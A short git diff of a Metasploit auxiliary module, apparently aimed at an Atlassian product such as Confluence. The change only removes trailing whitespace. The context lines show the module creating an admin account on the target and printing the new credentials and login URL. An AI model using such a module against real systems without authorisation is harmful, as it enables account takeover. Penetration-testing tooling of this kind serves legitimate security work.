@@ -94,7 +94,7 @@ class MetasploitModule < Msf::Auxiliary
         'X-Atlassian-Token' => 'no-check'
       }
     )
-    
+
     return fail_with(Msf::Exploit::Failure::NoAccess, 'The admin user could not be created. Try a different username.') unless created_user
 
     print_warning('Admin user was created but setup could not be completed.') unless res&.code == 200
@@ -112,7 +112,7 @@ class MetasploitModule < Msf::Auxiliary
       protocol: 'tcp',
       status: Metasploit::Model::Login::Status::UNTRIED
     })
-      
+
     print_good("Admin user was created successfully. Credentials: #{datastore['NEW_USERNAME']} - #{datastore['NEW_PASSWORD']}")
     print_good("Now you can login as administrator from: http://#{datastore['RHOSTS']}:#{datastore['RPORT']}#{datastore['TARGETURI']}login.action")
   end
